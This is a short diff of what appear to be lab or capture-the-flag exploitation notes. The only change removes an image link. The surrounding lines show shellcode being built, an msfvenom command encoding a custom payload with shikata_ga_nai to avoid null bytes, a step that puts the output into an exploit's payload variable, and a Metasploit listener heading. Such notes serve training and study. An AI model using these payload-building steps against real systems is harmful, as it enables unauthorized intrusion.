@@ -44,7 +44,6 @@ cat stackadj payload > shellcode
 msfvenom -p generic/custom PAYLOADFILE=./shellcode -b "\x00" -e x86/shikata_ga_nai -f python
 ```
 Enter the output as the value of the "payload" variable. You may need to run this exploit a few times for it to work.
-![[Pasted image 20220406211356.png]]
 #### Metasploit Listener
 ```bash - kali
 sudo msfdb run
